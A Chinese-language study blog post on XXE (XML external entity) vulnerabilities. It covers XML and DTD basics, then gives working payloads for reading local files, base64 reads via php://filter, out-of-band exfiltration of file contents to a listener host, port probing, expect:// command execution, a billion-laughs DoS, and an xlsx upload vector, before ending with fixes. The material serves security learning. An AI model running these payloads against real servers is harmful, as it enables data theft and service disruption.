---
title: "XXE漏洞学习"
date: 2019-12-10T10:30:15+08:00
draft: false
tags: ['web漏洞']
categories: ['学习笔记']
---
这是我自己学习xxe漏洞的笔记以及一些我自己的理解,如果有什么哪里讲的不对的,还请大佬指出,以免误人子弟!

<!--more-->

在学习XXE之前,我们先来学习点基础知识!

# XML基础
## 1. 什么是XML?

        XML是一种用于标记电子文件使其具有结构性的可扩展标记语言（EXtensible Markup Language）.
    
       你可以理解为就是一种写法类似于 html 语言的数据格式文档。它的设计宗旨是传输数据，而不是显示数据。它的标签没有被预定义。您需要自行定义标签。它被设计为具有自我描述性。它是W3C的推荐标准。
    
       目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。

## 2.程序处理XML的过程
### 流程图:
![图片](https://ae01.alicdn.com/kf/U329ff4f7d6a14d788b5e54a8f7ec05e3z.jpg)

使用下面这个xml例子结合上图我给大家解释下:

### XML例子:
![图片](https://ae01.alicdn.com/kf/U103fd91502384ea7b96f225cfe1fc211w.jpg)

### 解释:
用户想要查询满足长头发、大眼睛、漂亮的脸庞和可爱美丽的这几个条件的18岁girl的信息

```
1. 程序(Application)接收到用户传递过来的这些数据(长头发、大眼睛、漂亮的脸庞和可爱美丽的18岁girl),然后将其交给XML Generator(XML生成器).
2. XML Generator(XML生成器)在接收到程序传递过来的数据后,会将这些数据进行一个规范化.最终生成XML数据(也就是我们上图的XML例子).

3. XML Generator(XML生成器)在生成XML数据后,然后会由我们的HTTP客户端(HTTP Client)将其(XML数据)通过HTTP协议传递给服务端(Web Server)
4. Web Server在接收到XML数据后则会将其交给XML Parser(XML解析器)
5. XML解析器则会对接收到的XML数据进行一个解析处理,然后将满足条件的18岁girl的信息返回给程序(Application),最终呈现给用户.
```
在这个过程中,我们可以把xml当作一个数据的传输媒介.
## 3.XML的语法
```
(1) XML 文档必须有一个根元素
解释:就是说在XML文档中必须有一个元素是其他元素的父元素(也就是说其他元素必须包含在这个根元素下).根元素与其他元素的关系:父子关系.
(2) XML 元素都必须有一个关闭标签
解释:也就是说XML元素必须有头有尾,一对一对的出现.
(3) XML 标签对大小敏感
解释:XML标签的开始标签和闭合标签必须大小写一致.(不能一个大写一个小写)
如:<abc></Abc>       ///这样就是错误的!
(4) XML 元素必须被正确的嵌套
解释:XML元素在嵌套使用的时候,必须是一对一对的嵌套,不能只嵌套一个结束标签或一个开始标签.
如:<abc><test></abc></test>       //这样就是错误的
<abc><test></test></abc>          //正确的嵌套

(5) XML 属性值必须加引号
解释:XML元素在设置了属性后,其属性值必须用引号包裹.
如:<abc color=blue>               //这样是错误的
```
## 4.XML文档结构

XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

![图片](https://ae01.alicdn.com/kf/Uea03fece837b43e8b738e9c8aa2c6dd0n.jpg)

### XML声明的解释:
```
(1) <?xml ?>   这是xml的一个标记,用于告诉浏览器这个文档xml文档.
(2) version="1.0"
    version属性：用于说明当前xml文档的版本，因为都是在用1.0，所以这个属性值大家都写1.0，version属性是必须的；
(3) encodeing="utf-8"
    encoding属性：用于说明当前xml文档使用的字符编码集，xml解析器会使用这个编码来解析xml文档。encoding属性是可选的，默认为UTF-8。注意，如果当前xml文档使用的字符编码集是gb2312，而encoding属性的值为UTF-8，那么一定会出错的；
```
## 5.DTD(文档类型定义)

DTD(Document Type Definition)即文档类型定义，用来为XML文档定义语义约束。

```
(1) 我们可以把DTD理解位一个模板,这个模板里面定义了用户自己创建的根元素以及对应的子元素和根元素的合法子元素和属性.
(2) 而"文档元素"则必须以我们的DTD为模板,来对XML的元素的内容进行相应的规范化.
```
### DTD的声明方式:
#### * 内部声明:

DTD被包含在XML源文件中,应当使用下面的语法包装在一个DOCTYPE声明中:

##### 语法:

```
<!DOCTYPE 根元素 [元素声明]>
```
##### 举例:
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE girl [
  <!ELEMENT girl (hair,eye,face,summary)>
  <!ELEMENT hair       (#PCDATA)>
  <!ELEMENT eye     (#PCDATA)>
  <!ELEMENT face  (#PCDATA)>
  <!ELEMENT summary     (#PCDATA)>
]>
<girl age="18">　　
<hair>长头发</hair>　　
<eye>大眼睛</eye>
<face>漂亮的脸庞</face>
<summary>可爱美丽的</summary>
</girl>　
```
##### 解析后:
![图片](https://ae01.alicdn.com/kf/Uf54d593684f44f109659fb2d91b92ecdT.jpg)

**以上 DTD内容的解释如下：**

```
!DOCTYPE girl   (第二行)定义此文档是 note 类型的文档。
!ELEMENT note (第三行)定义c note 元素有四个元素："to、from、heading,、body"
!ELEMENT to (第四行)定义 to 元素为 "#PCDATA" 类型
!ELEMENT from (第五行)定义 from 元素为 "#PCDATA" 类型
!ELEMENT heading (第六行)定义 heading 元素为 "#PCDATA" 类型
!ELEMENT body (第七行)定义 body 元素为 "#PCDATA" 类型
```
#### * 外部声明:

假如DTD位于XML源文件的外部,应当使用下面的语法封装在一个DOCTYPE定义中:

```
<!DOCTYPE 根元素 SYSTEM "文件名">
```
##### 举例:
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<girl age="18">　　
<hair>长头发</hair>　　
<eye>大眼睛</eye>
<face>漂亮的脸庞</face>
<summary>可爱美丽的</summary>
</girl>　
```
##### note.dtd内容:
```
<!ELEMENT girl (hair,eye,face,summary)>
<!ELEMENT hair       (#PCDATA)>
<!ELEMENT eye     (#PCDATA)>
<!ELEMENT face  (#PCDATA)>
<!ELEMENT summary     (#PCDATA)>
```
##### 解析后:
![图片](https://ae01.alicdn.com/kf/Ua11efef32057485780e903074ca841ebN.jpg)

### PCDATA:
PCDATA 表示包含字符或文本数据.这些文本将被解析器检查实体以及标记。不过，被解析的字符数据不应当包含任何 &、< 或者 > 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。

![图片](https://ae01.alicdn.com/kf/U770ab1493f6c4ea1854ce8f955352b100.jpg)

在 XML 中有 5 个预定义的实体引用：

![图片](https://ae01.alicdn.com/kf/U99b14280d81748cfada63fb194c5eb2cj.jpg)

##### 注释：
```
严格地讲，在 XML 中仅有字符 "<"和"&" 是非法的。省略号、引号和大于号是合法的，但是把它们替换为实体引用是个好的习惯。
```

 

如果我们想正常显示这几个特殊字符,又不想用实体引用,那我们可以看看下面的CDATA:

### CDATA:
     CDATA 指的是不应由 XML 解析器进行解析的文本数据.

```
在 XML 元素中，"<" 和 "&" 是非法的。
"<" 会产生错误，因为解析器会把该字符解释为新元素的开始。
"&" 也会产生错误，因为解析器会把该字符解释为字符实体的开始。
某些文本，比如 JavaScript 代码，包含大量 "<" 或 "&" 字符。为了避免错误，可以将脚本代码定义为 CDATA。
```
 CDATA 部分中的所有内容都会被解析器忽略。

##### 注释：

```
a. CDATA 部分不能包含字符串 "]]>"。也不允许嵌套的 CDATA 部分，这样会导致异常的闭合，从而使解析器报错。
b. 标记 CDATA 部分结尾的 "]]>" 不能包含空格或换行
```

**使用方法:**

![图片](https://ae01.alicdn.com/kf/U1174d84b45b34f5c9d7a66dedbac5d88F.jpg)

**举例:**

![图片](https://ae01.alicdn.com/kf/U33b1627adda64521866b6a854c41b9a7M.jpg)

其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 XML 中除了能标签以外，还需要有些内容是固定的.我们接下来就看看什么是实体.

### 6.DTD实体:

    实体是用于定义引用普通文本或特殊字符的快捷方式的变量。(实体其实可以看成一个变量，到时候我们可以在 XML 中通过 & 符号进行引用)

#### * 内部普通实体

##### 声明:

```
<!ENTITY 实体名称 "实体的值">
```
##### 引用:
```
一个实体的引用，由三部分构成:&符号, 实体名称, 分号。
```
具体例子:
![图片](https://ae01.alicdn.com/kf/U18c1ad1b7d544fdf855771a416ec862au.jpg)

#### * 外部普通实体

##### 声明:

```
<!ENTITY 实体名称 SYSTEM "URI/URL">

<!ENTITY 实体名称 PUBLIC "DTD标识名" "公用DTD的URI"

俩个关键字有什么区别:
    PUBLIC是指公用DTD,其是某个权威机构制定，供特定行业或公司.
    SYSTEM是指该外部DTD文件是私有的，即我们自己创建的，没有公开发行，只是个人或在公司内部或者几个合作单位之间使用.
    公用DTD使用PUBLIC代替了原来的SYSTEM，并增加了DTD标识名。
```
各语言引用外部实体时支持的一些协议:
![图片](https://ae01.alicdn.com/kf/Uaf0a2bb1345b4145a402dd70bd84ca9dx.jpg)

##### 具体例子:

![图片](https://ae01.alicdn.com/kf/Ue71b24f4a59d4c82b7cc2fdb7a001e33t.jpg)

现在浏览器不再支持对外部实体直接解析,所以这里借助php来解析.当然也能用其他语言

#### * 参数实体:

##### 声明:

```
内部：<!ENTITY % 实体名称 "实体值">

外部：<!ENTITY % 实体名称 SYSTEM "URI"
```
参数实体应注意以下几点：
```
(1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 “%实体名;” 引用
(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体
(3)和通用实体一样，参数实体也可以外部引用
```
     简单理解呢，就是参数实体不能像普通实体那样在xml文档内容中进行引用，它的引用范围只在当前xml文件的DTD声明中，或者是当前的DTD文件中。
##### 具体例子:

![图片](https://ae01.alicdn.com/kf/Ucee0ec74f2c740df898ba4339d591e2bE.jpg)

图: 内部参数实体声明及引用

# XXE漏洞简介
       XXE（XML EXternal Entity）即XML外部实体注入攻击，是一种常见的Web安全漏洞，发生在应用程序解析XML输入时，没有禁止外部实体的加载,导致攻击者可以通过XML的外部实体获取服务器中本应被保护的数据

## 产生原因:
在文档类型定义部分，可以引用外部的DTD文件，所以这里容易出现安全问题。

XML解析器解析外部实体时支持多种协议，如：使用file协议可以读取本地文件内容；使用http协议可以获取web资源等

因此攻击者可以构造恶意的外部实体，当解析器解析了包含恶意外部实体的XML类型文件时,便会导致XXE攻击。

## 攻击方式:
显式攻击：攻击者通过正常的回显将外部实体里的内容读出来

盲式攻击（blind XXE）：利用参数实体将本地文件内容读出来后，作为URL中的参数向其指定的服务器发起请求，然后在其指定服务器的日志中读出文件内容

# XXE漏洞利用
## 漏洞发现:
a. 首先寻找接受XML作为输入内容的端点。
```
(可以通过修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序的响应，看看程序是否解析了发送的内容，如果解析了，那么则可能有XXE攻击漏洞。 )
```
还可以尝试注入xml预定义的一些实体,看其是否报错.通过报错信息判断.
b. 如果站点解析xml,就可以尝试引用实体和DTD
c. 如果可以引用外部实体,则存在xxe漏洞.

##### 举例:

首先找xml内容输入点,然后检测XML是否会被成功解析

![图片](https://ae01.alicdn.com/kf/U8bcf2d0ee5c143c0a9bfa6ef7730881dV.jpg)

若可以被解析,则检测服务器是否支持DTD引用外部实体

![图片](https://ae01.alicdn.com/kf/U6590a2e4d8514e299781c8faf8d8d0b4P.jpg)

如果支持引用外部实体,则存在XXE漏洞!

## 具体利用:
### 1.有回显的本地文件读取:

读取文件的payload:

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE user [
<!ENTITY all SYSTEM "file:///C:/windows/system.ini">]>
<user><username>&all;</username><password>132123</password></user>
```
效果:
![图片](https://ae01.alicdn.com/kf/Uca6aa98b8c304a47adc441e1a6433a99U.jpg)

### 2.当所读取文件中包含了<或者&

当我们读取的文件中包含了一些特殊符号(如<      &)的时候,会发现爆了一堆错而且读取不到该文件的内容.

接下来记录下解决该问题的整个流程:

#### (1)尝试使用之前的payload进行读取包含特殊字符的文件:

![图片](https://ae01.alicdn.com/kf/Uff17cc1f4ae1497193cdc285b3f736f2J.jpg)

报错的原因:

```
主要是因为我们要读取的文件内容中存在很多的特殊字符：大于号、小于号等，我们在前面的XML基础巩固中也提到过，当xml的标签内还存在小于号、大于号等特殊字符时，尤其是小于号，会被XML解析器误认为是另一个标签的开始，这样就会造成解析的错误。
```
#### (2)既然是xml会把 < 等特殊字符解析导致的错误,那我们就可以使用之前讲的CDATA来绕过下:

但是CDATA并没有提供拼接的方法,所以我们无法直接将我们想要获取文件的内容直接拼接到CDATA区段里.

所以我们尝试在xml中对其进行一个拼接:
```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE user [
<!ENTITY start "<![CDATA[">
<!ENTITY xxe SYSTEM "file:///C:/test.txt">
<!ENTITY end "]]>">
]>

<user><username>&start;&xxe;&end;</username<password>132123</password></user>
```
##### 效果:
![图片](https://ae01.alicdn.com/kf/U8cffd88691d94d70a2cde48f4b307536t.jpg)

说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在 xml 中调用，那么要想在 DTD中拼接，我们知道我们只有一种选择，就是使用参数实体

#### (3)使用参数实体在内部DTD进行拼接:

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE user [
<!ENTITY % start "<![CDATA[">
<!ENTITY % xxe SYSTEM "file:///C:/test.txt">
<!ENTITY % end "]]>">
<!ENTITY all "%start;%xxe;%end;">
]>

<user><username>&all;</username><password>132123</password></user>
```
##### 效果:
![图片](https://ae01.alicdn.com/kf/Ue1e941620520453e86c3633fa4df321c2.jpg)

##### 还报错的原因:

```
根据XML规范所描述：“在DTD内部子集中的参数实体调用，不能混掺到标记语中”           

也就是说参数实体不能在内部DTD中进行拼接，但是XML规范还声明了一点：“外部参数实体不受此限制”，这就告诉我们可以使用外部的DTD来构造payload，将我们的CDATA内容拼接起来.
```
#### (4) 既然外部参数实体不受该限制,那:
```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE user [
<!ENTITY % start "<![CDATA[">
<!ENTITY % xxe SYSTEM "file:///C:/test.txt">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.1.223/xxe.dtd">
%dtd;
]>

<user><username>&all;</username><password>132123</password></user>
```
##### xxe.dtd文件内容:
```
<!ENTITY all "%start;%xxe;%end;">
```
##### 效果:
![图片](https://ae01.alicdn.com/kf/U052aeaba96d54b00bd28fe4f6650d487D.jpg)

终于解决了!!!!!

### 3.使用php伪协议进行读取文件:
如果该网站是php语言编写的,那我们还可以使用php的一些伪协议进行读取:

##### 用到的伪协议:

```
php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。
```
##### 实际利用:
```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE user [
<!ENTITY all SYSTEM "php://filter/read=convert.base64-encode/resource=C:/test.txt">]>
<user><username>&all;</username><password>132123</password></user>
```
##### 效果:
![图片](https://ae01.alicdn.com/kf/Ud0da5efe75ab47b38b4917662f564c34A.jpg)

然后我们将相应包中的base64的内容进行解码:

![图片](https://ae01.alicdn.com/kf/Ud6e80308efbe4ab7b10c4730966598d1V.jpg)

##### payload解释:

```
php://filter/read=convert.base64-encode/resource=C:/test.txt
意思是将C:/test.txt文件的内容进行一个base64加密
```
### 4.无回显的文件读取(OOB out-of-band 外带参数实体注入):
```
在实际情况中，大多数情况下服务器上的 XML 并不是输出用的，所以就少了输出这一环节，这样的话，即使漏洞存在，我们的payload的也被解析了，但是由于没有输出，我们也不知道解析得到的内容是什么，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带数据
```
##### 利用思路:
```
通过外部DTD的方式可以将内部参数实体的内容与外部DTD声明的实体的内容拼接起来.

利用payload来从目标主机读取到文件内容后，将文件内容作为url的一部分来请求我们本地监听的端口
```
##### 实际利用:
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://192.168.1.223/b.dtd">
%remote;%int;%send;]>
```
##### b.dtd文件内容:
```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///C:/test.txt">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://192.168.1.223:9999/?p=%file;'>">
```
##### 效果:
![图片](https://ae01.alicdn.com/kf/U1db26cf280a947f29957cef1af2e6b18c.jpg)

可以看到我们监听的端口成功接收到了包含文件内容的请求.

### 5.利用XXE进行端口探测:

因为我们的XML在引用外部DTD和外部实体的时候支持http协议,我们可以利用这个特点:

##### 实际利用:

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE user SYSTEM "http://192.168.1.223:999">
<user><username>&all;</username><password>132123</password></user>
```
##### 效果:
(1)探测一个开放的端口:

![图片](https://ae01.alicdn.com/kf/U0d757ade74f74607ba4f9699eba9b5a9n.jpg)

(2)探测一个没开放的端口

![图片](https://ae01.alicdn.com/kf/U134234b08fa84026beb18e97e246cc881.jpg)

可以看到当探测到开放的端口时,响应时间比较短,不开放的端口响应时间明显加长!

##### 利用burpsuite的爆破模块(Intruder)对所在网段进行一个80端口探测:

![图片](https://ae01.alicdn.com/kf/U8a92540567254b4697bfc517bdf04dbbV.jpg)

### 6.利用php的扩展执行系统命令
当目标机器安装并加载了PHP的expect扩展,可以执行系统命令.(由于这个扩展不是默认安装的,所以很少碰到!)

```
<?xml version="1.0"?>
<!DOCTYPE root [ <!ELEMENT  ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<root>&xxe;</root>
```
### 7.利用XXE进行DOS攻击

在实验的过程中发现,单独一个数据包并不明显,可以结合burpsuite的爆破模块使用!(实际测试切记不要尝试)

```
<?xml version="1.0"?>
     <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
     <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
     <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
     <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
     <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
     <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
     <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
     ]>
<lolz>&lol9;</lolz>
```
### 8.Java中比较经典的一个利用点:
一般在上传xlsx的地方有可能会存在xxe漏洞,我们就这种情况带大家看下如何利用:

(1)新建一个xlsx文件:

![图片](https://ae01.alicdn.com/kf/U2aa5a59b2c7f42bf81038f3c52f9f636w.jpg)

(2) 使用压缩软件打开刚刚创建的xlsx文件:

![图片](https://ae01.alicdn.com/kf/U8fe0f74e0acd44cebf914f17c19d07c2t.jpg)

(3) 复制里面的[Content_Types].xml文件出来,将其打开并添加如我们的xxe漏洞利用payload:

![图片](https://ae01.alicdn.com/kf/U185ad446f10243d7bb97a2c9a13ca728y.png)

(4)将插入payload的[Content_Types].xml文件复制到xlsx文件中(直接将其拖入到压缩包打开的xlsx即可)

![图片](https://ae01.alicdn.com/kf/U977afacb6a8e406b9a35d28045f71a1bG.jpg)

可以打开复制进去后的[Content_Types].xml文件验证下是否插入了我们的payload.

(5) 然后将我们修改后的xlsx文件进行上传,若服务器成功解析后,我们的机器则会接收到服务器的请求:

![图片](https://ae01.alicdn.com/kf/U2a92c02b21d94445a9a4ca469ab0362db.jpg)

可以看到在导出成功后,我们的机器成功接收到存在xxe漏洞服务器的请求!

# 漏洞修复
## 方案一：
过滤用户输入的xml数据，比如尖括号，一些关键字：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC等

## 方案二：
禁用外部实体(分别在对应语言中添加以下代码)：

```
PHP：
libxml_disable_entity_loader(true);

JAVA:
DocumentBuilderFactorydbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

Python：
from lxml import etree
xmlData= etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```
# 参考链接:
[https://xz.aliyun.com/t/3357](https://xz.aliyun.com/t/3357)

[http://hetianlab.com/expc.do?ce=283826e9-c82e-4e84-9ed2-5257b649152d](http://hetianlab.com/expc.do?ce=283826e9-c82e-4e84-9ed2-5257b649152d)

